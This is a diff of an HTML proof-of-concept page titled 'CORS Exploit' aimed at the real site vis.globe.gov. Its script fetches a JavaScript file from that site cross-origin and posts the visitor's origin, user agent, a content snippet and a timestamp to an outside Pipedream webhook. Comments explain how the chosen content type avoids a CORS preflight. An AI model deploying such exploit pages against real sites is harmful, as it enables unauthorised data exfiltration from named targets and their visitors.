@@ -1,48 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>GLOBE.gov CORS Exploit</title>
-</head>
+<html>
+<head><title>CORS Exploit Final</title></head>
 <body>
-<h2>🧪 Testing vis.globe.gov CORS Misconfiguration</h2>
-<pre id="output">Starting PoC...</pre>
+<h2>🔥 Exploiting vis.globe.gov CORS</h2>
+<pre id="log">Loading...</pre>
 
 <script>
 const webhook = "https://eo6hxedl2p03s10.m.pipedream.net";
 
 function log(msg) {
-  document.getElementById("output").textContent += "\n" + msg;
-  console.log(msg);
+  document.getElementById("log").textContent += "\n" + msg;
 }
 
 (async () => {
   try {
-    log("📡 Fetching from vis.globe.gov...");
-    const response = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js");
-    log("✅ Response Status: " + response.status);
+    const res = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js");
+    const text = await res.text();
 
-    const content = await response.text();
-    const payload = `
-Exploit Success:
-Origin: ${location.origin}
-User-Agent: ${navigator.userAgent}
-Timestamp: ${new Date().toISOString()}
+    log("✅ Loaded VISmain.js (status " + res.status + ")");
 
---- JS Content Sample ---
-${content.slice(0, 500)}
-    `;
+    const params = new URLSearchParams();
+    params.append("origin", location.origin);
+    params.append("ua", navigator.userAgent);
+    params.append("snippet", text.slice(0, 500));
+    params.append("time", new Date().toISOString());
 
-    const xhr = new XMLHttpRequest();
-    xhr.open("POST", webhook, true);
-    xhr.setRequestHeader("Content-Type", "text/plain"); // ✅ متوافق مع CORS
-    xhr.onreadystatechange = () => {
-      if (xhr.readyState === XMLHttpRequest.DONE) {
-        log("📤 Data sent to Pipedream!");
-        log("Status: " + xhr.status);
-      }
-    };
-    xhr.send(payload);
+    const send = await fetch(webhook, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"  // ✅ هذا لا يسبب preflight
+      },
+      body: params
+    });
+
+    log("📤 Webhook POST Status: " + send.status);
   } catch (e) {
     log("❌ Error: " + e.message);
   }
